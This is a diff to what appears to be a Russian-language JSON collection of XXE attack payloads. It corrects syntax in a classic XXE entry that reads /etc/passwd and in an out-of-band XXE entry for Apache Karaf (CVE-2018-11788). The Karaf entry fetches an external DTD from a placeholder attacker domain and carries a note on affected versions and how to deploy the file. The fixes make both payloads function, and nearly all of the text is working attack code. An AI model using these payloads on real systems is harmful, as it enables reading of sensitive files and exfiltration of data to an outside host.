@@ -45,7 +45,7 @@
       "title": "Классический XXE — чтение /etc/passwd",
       "language": "xml",
       "tags": ["file-read", "classic", "linux"],
-      "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ELEMENT data (#ANY)>\n<!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>\n<data>&file;</data>"
+      "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ELEMENT data ANY>\n<!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>\n<data>&file;</data>"
     },
     {
       "subcategory": "Чтение файлов",
@@ -164,7 +164,7 @@
       "title": "OOB XXE через Apache Karaf (CVE-2018-11788)",
       "language": "xml",
       "tags": ["blind", "oob", "cve", "karaf"],
-      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://[ATTACKER.DOMAIN.TLD]\"> %dtd;]\n<features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\">\n    <feature name=\"deployer\" version=\"2.0\" install=\"auto\">\n    </feature>\n</features>",
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://[ATTACKER.DOMAIN.TLD]\"> %dtd;]>\n<features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\">\n    <feature name=\"deployer\" version=\"2.0\" install=\"auto\">\n    </feature>\n</features>",
       "meta": {
         "note": "Затрагивает Apache Karaf <= 4.2.1 и <= 4.1.6. XML-файл закидывается в папку deploy."
       }
